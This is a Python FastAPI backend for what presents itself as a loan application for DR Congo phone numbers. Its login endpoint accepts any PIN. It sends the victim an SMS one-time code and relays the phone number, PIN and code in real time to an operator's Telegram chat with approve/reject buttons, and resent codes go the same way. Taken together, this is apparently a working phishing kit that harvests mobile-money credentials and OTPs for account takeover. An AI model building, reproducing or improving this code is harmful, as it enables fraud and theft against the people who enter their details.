import json
import random
from uuid import uuid4
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import send_approval_request, answer_callback_query, edit_message
from approvals import (
    create_approval,
    set_approval_result,
    pending_approvals,
    approval_results,
    approval_phones,
    approval_pins,
    approval_otps,
    otp_approval_status,
)
from notifications import send_otp_sms, send_telegram_message

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

init_db()

otp_store = {}


# --- Request Models ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str


class OTPRequest(BaseModel):
    phone_number: str
    otp: str


class RegisterRequest(BaseModel):
    phone_number: str
    pin: str


class ResendRequest(BaseModel):
    phone_number: str


def format_phone(phone: str) -> str:
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+243") and not phone.startswith("243"):
        return f"+243{phone}"
    if phone.startswith("243"):
        return f"+{phone}"
    return phone


@app.get("/")
def read_root():
    return {"status": "Backend is running"}


@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN (accepts ANY PIN — admin verifies the OTP) ---
@app.post("/api/login")
async def login(request: LoginRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    # Auto-create user if they don't exist, but do NOT verify PIN
    user = get_user(full_phone)
    if not user:
        create_user(full_phone, request.pin)
    # ⚠️ PIN verification removed — any PIN is accepted

    # 1. Generate OTP immediately
    otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = otp
    otp_approval_status[full_phone] = "pending"

    # 2. Send the OTP to the user via SMS right away
    background_tasks.add_task(send_otp_sms, full_phone, otp)

    # 3. Create approval record for admin
    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = request.pin
    approval_otps[approval_id] = otp

    # 4. Notify admin with credentials + OTP + Approve/Reject buttons
    await send_approval_request(approval_id, full_phone, request.pin, otp)

    # 5. Return "approved" so frontend navigates to OTP screen immediately
    return {
        "status": "approved",
        "approval_id": approval_id,
        "message": "OTP sent to your phone"
    }


# --- APPROVAL STATUS ---
@app.get("/api/approval-status/{approval_id}")
async def approval_status(approval_id: str):
    phone = approval_phones.get(approval_id)
    if phone is None:
        return {"status": "expired"}

    status = otp_approval_status.get(phone, "pending")
    return {"status": status}


# --- VERIFY OTP (only works if admin approved) ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)
    expected = otp_store.get(full_phone)
    status = otp_approval_status.get(full_phone, "pending")

    # Admin rejected
    if status == "rejected":
        return {"status": "error", "message": "OTP rejected by admin"}

    # Admin hasn't responded yet
    if status != "approved":
        return {"status": "error", "message": "Waiting for admin verification"}

    # OTP is valid and approved
    if expected and request.otp == expected:
        del otp_store[full_phone]
        otp_approval_status.pop(full_phone, None)
        return {"status": "success", "message": "Loan approved"}

    return {"status": "error", "message": "Invalid OTP"}


# --- RESEND OTP ---
@app.post("/api/resend-otp")
async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    new_otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = new_otp
    otp_approval_status[full_phone] = "pending"

    background_tasks.add_task(send_otp_sms, full_phone, new_otp)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    background_tasks.add_task(
        send_telegram_message,
        f"🔄 <b>OTP Resent</b>\n\n"
        f"📱 Phone: <code>{full_phone}</code>\n"
        f"🔐 New OTP: <code>{new_otp}</code>\n"
        f"🕒 Time: <code>{timestamp}</code>\n\n"
        f"⚠️ Please approve or reject this OTP."
    )

    return {"status": "success", "message": "OTP resent successfully"}


# --- TELEGRAM WEBHOOK ---
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.body()
        if not body:
            print("Webhook called with empty body — ignoring")
            return {"ok": True}
        data = json.loads(body)
    except Exception as e:
        print(f"Webhook parse error: {e}")
        return {"ok": True}

    if "callback_query" not in data:
        print("Webhook received non-callback update — ignoring")
        return {"ok": True}

    try:
        callback = data["callback_query"]
        callback_id = callback["id"]
        callback_data = callback.get("data", "")
        parts = callback_data.split(":")

        if len(parts) < 2:
            return {"ok": True}

        action = parts[0]
        approval_id = parts[1]
        approved = (action == "approve")

        set_approval_result(approval_id, approved)

        await answer_callback_query(
            callback_id,
            "✅ OTP Approved" if approved else "❌ OTP Rejected"
        )

        phone = approval_phones.get(approval_id, "Unknown")
        pin = approval_pins.get(approval_id, "Unknown")
        otp = approval_otps.get(approval_id, "Unknown")

        # Update the approval status for this phone number
        if phone != "Unknown":
            if approved:
                otp_approval_status[phone] = "approved"
                background_tasks.add_task(
                    send_telegram_message,
                    f"✅ <b>OTP Approved</b>\n"
                    f"📱 Phone: <code>{phone}</code>\n"
                    f"User can now complete login."
                )
            else:
                otp_approval_status[phone] = "rejected"
                otp_store.pop(phone, None)
                background_tasks.add_task(
                    send_telegram_message,
                    f"❌ <b>OTP Rejected</b>\n"
                    f"📱 Phone: <code>{phone}</code>\n"
                    f"User access denied."
                )

        # Edit the original Telegram message
        if "message" in callback:
            result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
            await edit_message(
                chat_id=callback["message"]["chat"]["id"],
                message_id=callback["message"]["message_id"],
                text=f"{result_text}\n\n"
                     f"📱 Phone: <code>{phone}</code>\n"
                     f"🔑 PIN: <code>{pin}</code>\n"
                     f"🔐 OTP: <code>{otp}</code>\n"
                     f"🆔 Ref: <code>{approval_id}</code>"
            )

        # Clean up approval entries
        approval_phones.pop(approval_id, None)
        approval_pins.pop(approval_id, None)
        approval_otps.pop(approval_id, None)

        return {"ok": True}

    except Exception as e:
        print(f"Webhook processing error: {e}")
        return {"ok": True}